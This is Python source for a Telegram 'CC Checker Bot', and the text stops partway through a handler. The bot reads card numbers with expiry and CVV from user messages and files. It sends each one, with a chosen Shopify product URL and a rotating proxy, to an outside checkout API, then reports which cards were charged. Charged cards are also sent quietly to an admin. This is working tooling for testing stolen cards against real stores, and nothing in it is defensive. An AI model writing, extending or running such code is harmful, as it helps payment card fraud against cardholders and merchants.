from config import CheckerConfig
import asyncio
import re
import random
import sys
import os
import json
import aiohttp
from curl_cffi.requests import AsyncSession
from loguru import logger
from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import io

# PostgreSQL support
try:
    import psycopg2
    from psycopg2.extras import Json
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

# Setup logger
def setup_logger(script_name: str = "CC BOT") -> None:
    logger.remove()
    logger.level("DEBUG", color="<blue>")
    logger.level("INFO", color="<white>")
    logger.level("SUCCESS", color="<green>")
    logger.level("WARNING", color="<yellow>")
    logger.level("ERROR", color="<red>")
    logger.level("CRITICAL", color="<RED><bold>")

    log_format = (
        "<bold><cyan>[{extra[script]}]</cyan></bold> "
        "- <dim>{time:YYYY-MM-DD HH:mm:ss}</dim> "
        "- <magenta>{line}</magenta> "
        "- <level>{message}</level>"
    )
    logger.configure(extra={"script": script_name})
    logger.add(sys.stdout, level="DEBUG", colorize=True, format=log_format)

setup_logger()
config = CheckerConfig()

# Database connection
DATABASE_URL = os.getenv("DATABASE_URL", "")

def get_db_connection():
    """Get PostgreSQL database connection"""
    if not HAS_POSTGRES or not DATABASE_URL:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

def init_database():
    """Initialize database tables"""
    conn = get_db_connection()
    if not conn:
        logger.warning("No database connection - using in-memory storage")
        return False

    try:
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id BIGINT PRIMARY KEY,
                proxy TEXT,
                products TEXT[],
                email TEXT,
                is_shippable BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database initialized successfully")
        return True
    except Exception as e:
        logger.error(f"Database init error: {e}")
        return False

# In-memory fallback
user_settings_cache = {}

def get_user_settings(user_id: int) -> dict:
    """Get or create user settings from database or cache"""
    # Try database first
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute(
                "SELECT proxy, products, email, is_shippable FROM user_settings WHERE user_id = %s",
                (user_id,)
            )
            row = cur.fetchone()
            cur.close()
            conn.close()

            if row:
                return {
                    "proxy": row[0],
                    "products": row[1] if row[1] else [],
                    "email": row[2],
                    "is_shippable": row[3]
                }
            else:
                # Create new user settings
                return save_user_settings(user_id, {
                    "proxy": None,
                    "products": [],
                    "email": None,
                    "is_shippable": False
                })
        except Exception as e:
            logger.error(f"Database read error: {e}")

    # Fallback to in-memory
    if user_id not in user_settings_cache:
        user_settings_cache[user_id] = {
            "proxy": None,
            "products": [],
            "email": None,
            "is_shippable": False
        }
    return user_settings_cache[user_id]

def save_user_settings(user_id: int, settings: dict) -> dict:
    """Save user settings to database"""
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO user_settings (user_id, proxy, products, email, is_shippable, updated_at)
                VALUES (%s, %s, %s, %s, %s, CURRENT_TIMESTAMP)
                ON CONFLICT (user_id) DO UPDATE SET
                    proxy = EXCLUDED.proxy,
                    products = EXCLUDED.products,
                    email = EXCLUDED.email,
                    is_shippable = EXCLUDED.is_shippable,
                    updated_at = CURRENT_TIMESTAMP
            """, (
                user_id,
                settings.get("proxy"),
                settings.get("products", []),
                settings.get("email"),
                settings.get("is_shippable", False)
            ))
            conn.commit()
            cur.close()
            conn.close()
            logger.debug(f"Saved settings for user {user_id}")
        except Exception as e:
            logger.error(f"Database save error: {e}")

    # Also update cache
    user_settings_cache[user_id] = settings
    return settings

def update_user_setting(user_id: int, key: str, value) -> dict:
    """Update a single setting for a user"""
    settings = get_user_settings(user_id)
    settings[key] = value
    return save_user_settings(user_id, settings)


# Session state management for pause/stop and input waiting
user_sessions = {}

def get_user_session(user_id: int) -> dict:
    """Get or create a user's checking session state"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "paused": False,
            "stopped": False,
            "checking": False,
            "waiting_for": None  # None, "proxy", "product"
        }
    return user_sessions[user_id]

def reset_user_session(user_id: int):
    """Reset a user's session state"""
    user_sessions[user_id] = {
        "paused": False,
        "stopped": False,
        "checking": False,
        "waiting_for": None
    }

def set_waiting_for(user_id: int, waiting_type: str):
    """Set what input the bot is waiting for from user"""
    session = get_user_session(user_id)
    session["waiting_for"] = waiting_type

def get_waiting_for(user_id: int) -> str:
    """Get what input the bot is waiting for"""
    session = get_user_session(user_id)
    return session.get("waiting_for")


def create_lista_(text: str):
    """Extract credit card numbers from text"""
    m = re.findall(
        r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(
        ("5", "6", "3", "4")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]


async def auto_shopify_client(
    card,
    product_url,
    email: str = None,
    is_shippable: bool = False,
    proxies: list = [],
    max_retries: int = 4,
    request_timeout: int =  45,
    logger = None
):
    last_error = None
    timeout = aiohttp.ClientTimeout(total=request_timeout)  # 45s timeout

    async with aiohttp.ClientSession(timeout=timeout) as session:
        for attempt in range(1, max_retries + 1):
            try:
                data = {
                    "card": card,
                    "product_url": product_url,
                    "email": email,
                    "is_shippable": is_shippable,
                    "proxy": random.choice(proxies) if proxies else None,
                }

                async with session.post(
                    "http://api.voidapi.xyz:8080/v2/shopify_graphql",
                    json=data,
                ) as response:

                    result = await response.json()
                    status = result.get("status")
                    error = result.get("error")

                    if result.get("success"):
                        return result.get("data")

                    # Debug info
                    logger.info( f"[Attempt {attempt}/{max_retries}] status={status}, error={error}")

                    # Retry conditions
                    if error and any(err in error for err in (
                        "ProxyError",
                        "Failed to connect to proxy",
                        "Failed to initialize checkout data",
                        "Failed to perform, curl",
                        'Failed to add to cart'
                    )):
                        last_error = {"error": error, "status": status}

                    elif error and "captcha is required for this checkout" in error.lower():
                        last_error = {
                            "error": "Captcha triggered! Try again.", "status": status}

                    else:
                        # ✅ Non-retriable
                        return result

            except aiohttp.ClientError as e:
                last_error = {"error": f"Client....",
                              "status": "network_error"}
                logger.warning(f"[Attempt {attempt}/{max_retries}] ClientError: {e}")

            except asyncio.TimeoutError:
                last_error = {
                    "error": "TimeoutError: Request took too long", "status": "timeout"}
                logger.warning(
                    f"[Attempt {attempt}/{max_retries}] Request timed out after 45s")

            except Exception as e:
                last_error = {"error": str(e), "status": "exception"}
                logger.warning(
                    f"[Attempt {attempt}/{max_retries}] Unexpected error: {e}")

            # Sleep before retrying
            if attempt < max_retries:
                await asyncio.sleep(0.3)

    # If retries exhausted, return last known error
    return last_error or {"status": "UnknownError", "error": "Unexpected error. Try again..."}


# =============================================================================
# CONCURRENCY MANAGEMENT - Per-user + Global limits
# =============================================================================

# Global semaphore - prevents server overload (all users combined)
# Uses config value (default 150) to allow multiple users to work simultaneously
global_semaphore = asyncio.Semaphore(config.GLOBAL_CONCURRENCY_LIMIT)

# Per-user semaphores - each user gets their own limit
# This ensures User A's checking doesn't block User B
user_semaphores = {}
user_semaphore_lock = asyncio.Lock()


async def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    """Get or create a semaphore for a specific user"""
    async with user_semaphore_lock:
        if user_id not in user_semaphores:
            # Each user can process CONCURRENCY_LIMIT cards at once
            user_semaphores[user_id] = asyncio.Semaphore(config.CONCURRENCY_LIMIT)
        return user_semaphores[user_id]


def cleanup_user_semaphore(user_id: int):
    """Remove user semaphore when they're done (optional cleanup)"""
    if user_id in user_semaphores:
        del user_semaphores[user_id]


async def bin_lookup(bin_number: str):
    """Lookup BIN information"""
    try:
        if bin_number.startswith(('4', '5', '3', '6')):
            async with AsyncSession() as session:
                url = f"https://api.voidapi.xyz/v2/bin_lookup/{bin_number[:6]}"
                response = await session.get(url)
                if response.status_code == 200:
                    return response.json()
                else:
                    return {"error": f"Unexpected status code {response.status_code}", "status": "error"}
        else:
            return {"error": "Invalid bin number.", "status": "error"}
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
        return {"error": str(e), "status": "error"}


def user_has_products(user_id: int) -> bool:
    """Check if user has set product URLs"""
    settings = get_user_settings(user_id)
    return len(settings.get("products", [])) > 0


def create_progress_bar(current: int, total: int, length: int = 10) -> str:
    """Create a visual progress bar"""
    if total == 0:
        return "░" * length
    filled = int(length * current / total)
    empty = length - filled
    bar = "█" * filled + "░" * empty
    percent = int(100 * current / total)
    return f"[{bar}] {percent}%"


async def process_single_card(card: str, user_id: int = None, user_settings: dict = None) -> dict:
    """
    Process a single card and return result.

    Uses two-level concurrency control:
    1. Per-user semaphore: Each user can process up to CONCURRENCY_LIMIT cards at once
    2. Global semaphore: Total concurrent operations across all users capped at GLOBAL_CONCURRENCY_LIMIT

    This ensures User A checking cards doesn't block User B.

    Args:
        card: Card string to check
        user_id: User ID for concurrency control
        user_settings: Pre-fetched user settings (optional, avoids DB calls inside semaphore)
    """
    # Get user settings BEFORE acquiring semaphore (non-blocking)
    if user_settings is None:
        settings = get_user_settings(user_id) if user_id else {}
    else:
        settings = user_settings

    # Check for products early (before acquiring semaphore)
    user_products = settings.get("products", [])
    if not user_products:
        return {
            "card": card,
            "product_url": None,
            "response": {"error": "No product set. Use /addproduct first.", "success": False},
            "bin_data": {}
        }

    # Get user-specific semaphore (or create one)
    user_sem = await get_user_semaphore(user_id) if user_id else asyncio.Semaphore(config.CONCURRENCY_LIMIT)

    # Acquire both: user limit AND global limit
    async with user_sem:
        async with global_semaphore:
            try:
                logger.info(f'Processing card: {card} (user: {user_id})')

                product_url = random.choice(user_products)

                # Use user's proxy or fall back to config
                user_proxy = settings.get("proxy")
                proxies = [user_proxy] if user_proxy else config.PROXY_LIST

                response = await auto_shopify_client(
                    card=card,
                    product_url=product_url,
                    email=settings.get("email") or config.DEFAULT_EMAIL,
                    is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
                    proxies=proxies,
                    logger=logger
                )

                # BIN lookup is fast and non-critical - run concurrently
                bin_data = await bin_lookup(card[:6])

                return {
                    "card": card,
                    "product_url": product_url,
                    "response": response,
                    "bin_data": bin_data
                }

            except asyncio.CancelledError:
                # Handle cancellation gracefully
                logger.warning(f"Card check cancelled: {card}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": "Check cancelled", "success": False},
                    "bin_data": {}
                }
            except Exception as e:
                # Catch ALL exceptions to prevent stopping the batch
                logger.error(f"Error processing card {card}: {e}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": f"Processing error: {str(e)[:50]}", "success": False},
                    "bin_data": {}
                }


def format_result(result: dict, show_full: bool = True) -> str:
    """Format check result for Telegram message"""
    card = result["card"]
    response = result["response"]
    bin_data = result.get("bin_data", {})

    bin_info = ""
    if show_full and bin_data.get("success"):
        bd = bin_data.get("data", {})
        bank = bd.get("bank", "Unknown")
        emoji = bd.get("emoji", "")
        country = bd.get("country", "Unknown")
        level = bd.get("level", "Unknown")
        card_type = bd.get("type", "Unknown")
        scheme = bd.get("scheme", "Unknown")
        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Type*: {scheme} {card_type} {level}\n🌍 *Country*: {country} {emoji}"

    # Get response details
    error = response.get("error", "")
    message = response.get("message", "")
    gateway_msg = response.get("gateway_message", "")
    decline_code = response.get("decline_code", "")

    # Build status message with all available info
    status_parts = []
    if message:
        status_parts.append(message)
    if error:
        status_parts.append(error)
    if gateway_msg and gateway_msg not in str(status_parts):
        status_parts.append(f"Gateway: {gateway_msg}")
    if decline_code and decline_code not in str(status_parts):
        status_parts.append(f"Code: {decline_code}")

    status_text = " | ".join(status_parts) if status_parts else "Unknown"

    if response.get('success'):
        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
    else:
        if '3ds' in str(error).lower() or '3d' in str(error).lower():
            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
        else:
            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"


# Global bot application reference for admin notifications
_bot_app = None

async def notify_admin_charged(card: str, result: dict, user_id: int, username: str = None):
    """
    Silently notify admin when a card is successfully charged.
    This runs in background and never interrupts the user's flow.
    """
    try:
        admin_id = config.ADMIN_USER_ID
        if not admin_id or not _bot_app:
            return

        response = result.get("response", {})

        # Build admin notification message
        message_parts = [
            "💰 *CHARGED CARD FOUND*",
            "",
            f"💳 `{card}`",
            "",
        ]

        # Add response details
        if response.get("message"):
            message_parts.append(f"📝 *Response*: {response.get('message')}")
        if response.get("gateway_message"):
            message_parts.append(f"🔗 *Gateway*: {response.get('gateway_message')}")

        # Add user info
        message_parts.append("")
        message_parts.append(f"👤 *Found by*: {username or 'Unknown'} (`{user_id}`)")

        admin_message = "\n".join(message_parts)

        # Send to admin silently (in background, no await blocking)
        await _bot_app.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            parse_mode="Markdown"
        )

    except Exception as e:
        # Silently fail - never interrupt user's checking process
        logger.debug(f"Admin notification failed (silent): {e}")


# Inline Keyboard Builders
def get_main_menu_keyboard():
    """Build the main menu inline keyboard"""
    keyboard = [
        [InlineKeyboardButton("📦 Products", callback_data="menu_products")],
        [InlineKeyboardButton("🌐 Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_check_info")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_products_keyboard(user_id: int):
    """Build products management keyboard"""
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    keyboard = []
    # Add product button at top
    keyboard.append([InlineKeyboardButton("➕ Add Product", callback_data="prod_add")])

    for i, url in enumerate(products):
        # Shorten URL for display
        display = url.split("/products/")[-1][:20] if "/products/" in url else url[:20]
        keyboard.append([
            InlineKeyboardButton(f"📦 {display}", callback_data=f"prod_view_{i}"),
            InlineKeyboardButton("🗑️", callback_data=f"prod_del_{i}")
        ])

    if products:
        keyboard.append([InlineKeyboardButton("🗑️ Clear All", callback_data="prod_clear_all")])

    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def get_proxy_keyboard(user_id: int):
    """Build proxy management keyboard"""
    settings = get_user_settings(user_id)
    proxy = settings.get("proxy")

    keyboard = []
    keyboard.append([InlineKeyboardButton("➕ Set Proxy", callback_data="proxy_set")])
    if proxy:
        keyboard.append([InlineKeyboardButton("🗑️ Clear Proxy", callback_data="proxy_clear")])
    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def get_checking_keyboard(paused: bool = False):
    """Build checking control keyboard"""
    if paused:
        keyboard = [
            [
                InlineKeyboardButton("▶️ Resume", callback_data="chk_resume"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    else:
        keyboard = [
            [
                InlineKeyboardButton("⏸️ Pause", callback_data="chk_pause"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(callback: str = "menu_main"):
    """Simple back button keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data=callback)]])

def get_cancel_keyboard():
    """Cancel input keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_input")]])


# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command - show main menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Welcome! Use the buttons below to navigate.\n\n"
        "📎 *Send .txt file* or paste cards to check them.\n\n"
        "*Card Format:* `4111111111111111|12|2025|123`",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard()
    )


async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /menu command - show interactive menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard()
    )


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback queries from inline keyboards"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Clear waiting state when navigating menus
    if data.startswith("menu_"):
        set_waiting_for(user_id, None)

    # Main menu
    if data == "menu_main":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔥 *CC Checker Bot*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )

    # Products menu
    elif data == "menu_products":
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if products:
            text = f"📦 *Your Products* ({len(products)})\n\n"
            for i, url in enumerate(products):
                short_url = url[:50] + "..." if len(url) > 50 else url
                text += f"{i+1}. `{short_url}`\n"
        else:
            text = "📦 *Your Products*\n\nNo products added yet.\n\nClick ➕ Add Product to add one."

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_products_keyboard(user_id)
        )

    # Add product - ask for URL
    elif data == "prod_add":
        set_waiting_for(user_id, "product")
        await query.edit_message_text(
            "📦 *Add Product*\n\n"
            "Send me a Shopify product URL:\n\n"
            "Example: `https://store.com/products/item`",
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard()
        )

    # View single product
    elif data.startswith("prod_view_"):
        idx = int(data.split("_")[-1])
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if idx < len(products):
            url = products[idx]
            await query.edit_message_text(
                f"📦 *Product #{idx + 1}*\n\n`{url}`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🗑️ Remove", callback_data=f"prod_del_{idx}")],
                    [InlineKeyboardButton("◀️ Back", callback_data="menu_products")]
                ])
            )

    # Delete product
    elif data.startswith("prod_del_"):
        idx = int(data.split("_")[-1])
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if idx < len(products):
            removed = products.pop(idx)
            update_user_setting(user_id, "products", products)

            await query.edit_message_text(
                f"✅ *Product Removed*\n\n`{removed}`\n\n📦 Remaining: {len(products)}",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )

    # Clear all products
    elif data == "prod_clear_all":
        update_user_setting(user_id, "products", [])
        await query.edit_message_text(
            "✅ *All Products Cleared*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_products")
        )

    # Proxy menu
    elif data == "menu_proxy":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")

        if proxy:
            text = f"🌐 *Your Proxy*\n\n`{proxy}`"
        else:
            text = "🌐 *Your Proxy*\n\nNo proxy set.\n\nClick ➕ Set Proxy to add one."

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_proxy_keyboard(user_id)
        )

    # Set proxy - ask for input
    elif data == "proxy_set":
        set_waiting_for(user_id, "proxy")
        await query.edit_message_text(
            "🌐 *Set Proxy*\n\n"
            "Send me your proxy in this format:\n\n"
            "`host:port:username:password`\n\n"
            "Example: `proxy.example.com:8080:user:pass`",
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard()
        )

    # Clear proxy
    elif data == "proxy_clear":
        update_user_setting(user_id, "proxy", None)
        await query.edit_message_text(
            "✅ *Proxy Cleared*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_proxy")
        )

    # Settings menu
    elif data == "menu_settings":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")
        products = settings.get("products", [])

        text = (
            "⚙️ *Your Settings*\n\n"
            f"🌐 *Proxy*: `{proxy or 'Not set'}`\n"
            f"📦 *Products*: {len(products)}\n"
        )

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Check cards info
    elif data == "menu_check_info":
        await query.edit_message_text(
            "💳 *Check Cards*\n\n"
            "*How to check cards:*\n\n"
            "1️⃣ Paste a card directly:\n"
            "`4111111111111111|12|2025|123`\n\n"
            "2️⃣ Send a .txt file with cards\n\n"
            "*Supported formats:*\n"
            "• `card|mm|yyyy|cvv`\n"
            "• `card|mm|yy|cvv`\n"
            "• `card:mm:yyyy:cvv`\n"
            "• `card/mm/yyyy/cvv`",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Cancel input
    elif data == "cancel_input":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "❌ *Cancelled*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Checking controls
    elif data == "chk_pause":
        session = get_user_session(user_id)
        session["paused"] = True
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=True))

    elif data == "chk_resume":
        session = get_user_session(user_id)
        session["paused"] = False
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=False))

    elif data == "chk_stop":
        session = get_user_session(user_id)
        session["stopped"] = True
        session["paused"] = False
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except:
            pass


async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setproxy command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/setproxy host:port:user:pass`\n"
            "Example: `/setproxy proxy.example.com:8080:username:password`\n\n"
            "To remove proxy: `/setproxy clear`",
            parse_mode="Markdown"
        )
        return

    proxy_str = context.args[0]

    if proxy_str.lower() == "clear":
        update_user_setting(user_id, "proxy", None)
        await update.message.reply_text("✅ Proxy cleared! Using default proxy.")
    else:
        update_user_setting(user_id, "proxy", proxy_str)
        await update.message.reply_text(f"✅ Proxy set to: `{proxy_str}`", parse_mode="Markdown")


async def validate_shopify_product(url: str) -> tuple[bool, str]:
    """Validate if a URL is a valid Shopify product page"""
    try:
        # Check URL format
        if "/products/" not in url:
            return False, "URL must contain '/products/' (Shopify product URL)"

        # Try to fetch product JSON
        json_url = url.rstrip('/') + ".json"

        async with aiohttp.ClientSession() as session:
            async with session.get(json_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "product" in data:
                        product_title = data["product"].get("title", "Unknown")
                        return True, f"Product found: {product_title}"
                    else:
                        return False, "Not a valid Shopify product page"
                elif resp.status == 404:
                    return False, "Product not found (404)"
                elif resp.status == 401 or resp.status == 403:
                    # Some stores block JSON access, try HTML
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as html_resp:
                        if html_resp.status == 200:
                            text = await html_resp.text()
                            if 'Shopify' in text or 'shopify' in text or '/products/' in text:
                                return True, "Product page accessible"
                            else:
                                return False, "Not a Shopify store"
                        else:
                            return False, f"Page not accessible (HTTP {html_resp.status})"
                else:
                    return False, f"Failed to access product (HTTP {resp.status})"
    except asyncio.TimeoutError:
        return False, "Request timed out"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


async def addproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addproduct command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/addproduct <shopify_product_url>`\n"
            "Example: `/addproduct https://store.com/products/item`",
            parse_mode="Markdown"
        )
        return

    url = context.args[0]
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    if url in products:
        await update.message.reply_text("⚠️ This product URL is already in your list.")
        return

    # Validate the product URL
    status_msg = await update.message.reply_text("⏳ Validating product URL...")

    is_valid, message = await validate_shopify_product(url)

    if is_valid:
        products.append(url)
        update_user_setting(user_id, "products", products)
        await status_msg.edit_text(
            f"✅ Product added!\n\n"
            f"📝 {message}\n"
            f"📦 Total products: {len(products)}",
            parse_mode="Markdown"
        )
    else:
        await status_msg.edit_text(
            f"❌ *Failed to add product*\n\n"
            f"📝 {message}\n\n"
            f"Make sure the URL is a valid Shopify product page.",
            parse_mode="Markdown"
        )


async def removeproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeproduct command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/removeproduct <url>`\n"
            "Example: `/removeproduct https://store.com/products/item`\n\n"
            "Use `/products` to see your product list.",
            parse_mode="Markdown"
        )
        return

    url = context.args[0]
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    if url in products:
        products.remove(url)
        update_user_setting(user_id, "products", products)
        await update.message.reply_text(
            f"✅ Product removed!\n\n"
            f"📦 Remaining products: {len(products)}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Product not found in your list.\n\n"
            "Use `/products` to see your saved products.",
            parse_mode="Markdown"
        )


async def products_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /products command - list all products"""
    user_id = update.effective_user.id
    settings = get_user_settings(user_id)

    if not settings["products"]:
        await update.message.reply_text(
            "📦 *Your Product List*\n\n"
            "No products set. Using default product.\n\n"
            "Add products with: `/addproduct <url>`",
            parse_mode="Markdown"
        )
        return

    products_text = "\n".join([f"{i+1}. `{url}`" for i, url in enumerate(settings["products"])])
    await update.message.reply_text(
        f"📦 *Your Product List*\n\n{products_text}",
        parse_mode="Markdown"
    )


async def clearproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproducts command"""
    user_id = update.effective_user.id
    update_user_setting(user_id, "products", [])
    await update.message.reply_text("✅ All products cleared!")


def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return config.ADMIN_USER_ID and user_id == config.ADMIN_USER_ID


async def dbstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dbstatus command - admin only debug command"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("🚫 This command is restricted to administrators.")
        return

    status_parts = ["🔧 *Database Status*\n"]

    # Check if PostgreSQL is available
    if not HAS_POSTGRES:
        status_parts.append("⚠️ *PostgreSQL driver*: Not installed")
        status_parts.append("📦 Using: In-memory storage (data lost on restart)")
    else:
        status_parts.append("✅ *PostgreSQL driver*: Installed")

    # Check DATABASE_URL
    if DATABASE_URL:
        # Mask the URL for security
        masked_url = DATABASE_URL[:20] + "..." if len(DATABASE_URL) > 20 else DATABASE_URL
        status_parts.append(f"✅ *DATABASE\\_URL*: Set (`{masked_url}`)")
    else:
        status_parts.append("❌ *DATABASE\\_URL*: Not set")

    # Test actual connection
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()

            # Count users
            cur.execute("SELECT COUNT(*) FROM user_settings")
            user_count = cur.fetchone()[0]
            status_parts.append(f"\n📊 *Database Stats*:")
            status_parts.append(f"• Total users: {user_count}")

            # Get recent users (last 5)
            cur.execute("""
                SELECT user_id,
                       COALESCE(array_length(products, 1), 0) as product_count,
                       proxy IS NOT NULL as has_proxy
                FROM user_settings
                ORDER BY user_id DESC
                LIMIT 5
            """)
            recent_users = cur.fetchall()

            if recent_users:
                status_parts.append(f"\n👥 *Recent Users* (last 5):")
                for row in recent_users:
                    uid, prod_count, has_proxy = row
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

            # Test write capability
            cur.execute("SELECT 1")
            status_parts.append(f"\n✅ *Connection*: Active & working")

            cur.close()
            conn.close()
        except Exception as e:
            status_parts.append(f"\n❌ *Error*: {str(e)}")
            conn.close()
    else:
        if DATABASE_URL:
            status_parts.append(f"\n❌ *Connection*: Failed to connect")
        else:
            # Show in-memory cache stats
            status_parts.append(f"\n📊 *In-Memory Stats*:")
            status_parts.append(f"• Cached users: {len(user_settings_cache)}")
            if user_settings_cache:
                for uid, settings in list(user_settings_cache.items())[:5]:
                    prod_count = len(settings.get("products", []))
                    has_proxy = settings.get("proxy") is not None
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

    # Add concurrency stats
    status_parts.append(f"\n⚡ *Concurrency*:")
    status_parts.append(f"• Global limit: {config.GLOBAL_CONCURRENCY_LIMIT}")
    status_parts.append(f"• Per-user limit: {config.CONCURRENCY_LIMIT}")
    status_parts.append(f"• Active user semaphores: {len(user_semaphores)}")

    # Show active users with semaphores
    if user_semaphores:
        status_parts.append(f"• Users with active checks:")
        for uid in list(user_semaphores.keys())[:5]:
            status_parts.append(f"  └ `{uid}`")

    await update.message.reply_text(
        "\n".join(status_parts),
        parse_mode="Markdown"
    )


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /settings command"""
    user_id = update.effective_user.id
    settings = get_user_settings(user_id)

    proxy_status = f"`{settings['proxy']}`" if settings["proxy"] else "Default"
    products_count = len(settings["products"])

    msg = (
        "⚙️ *Your Settings*\n\n"
        f"🌐 *Proxy*: {proxy_status}\n"
        f"📦 *Products*: {products_count} URLs\n"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single card"""
    user_id = update.effective_user.id

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use the menu to add a product first.",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2025|123`", parse_mode="Markdown")
        return

    card_text = " ".join(context.args)
    cards = create_lista_(card_text)

    if not cards:
